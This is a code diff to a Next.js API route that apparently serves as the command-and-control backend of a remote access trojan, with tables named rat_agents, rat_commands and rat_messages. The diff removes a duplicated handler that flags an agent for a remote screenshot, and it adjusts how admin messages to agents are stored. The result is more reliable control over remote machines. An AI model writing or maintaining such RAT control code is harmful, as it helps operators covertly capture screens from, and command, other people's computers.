@@ -94,28 +94,17 @@ export async function POST(
       return NextResponse.json({ error: 'Command type required' }, { status: 400 })
     }
 
-    // FIX: screenshot uses a flag, not the command queue — prevents it firing on every heartbeat
     if (type === 'screenshot') {
       await sql`UPDATE rat_agents SET screenshot_requested = TRUE WHERE id = ${agentId}`
       return NextResponse.json({ success: true, command_id: 'screenshot_flag', message: 'Screenshot requested' })
-    }
-
-    // FIX: screenshots use a flag on rat_agents rather than a command row.
-    // This guarantees exactly one capture per button press — no stale unacked
-    // rows in rat_commands can ever cause repeated auto-screenshotting.
-    if (type === 'screenshot') {
-      await sql`
-        UPDATE rat_agents SET screenshot_requested = TRUE WHERE id = ${agentId}
-      `
-      return NextResponse.json({ success: true, command_id: null, message: 'Screenshot requested' })
     }
 
     // FIX: persist admin messages to rat_messages immediately so they appear
     // in the chat history without waiting for the client to reply.
     if (type === 'message' && payload?.body) {
       await sql`
-        INSERT INTO rat_messages (agent_id, sender, body, created_at)
-        VALUES (${agentId}, 'admin', ${payload.body as string}, NOW())
+        INSERT INTO rat_messages (agent_id, sender, body)
+        VALUES (${agentId}, 'admin', ${payload.body as string})
       `
     }
 
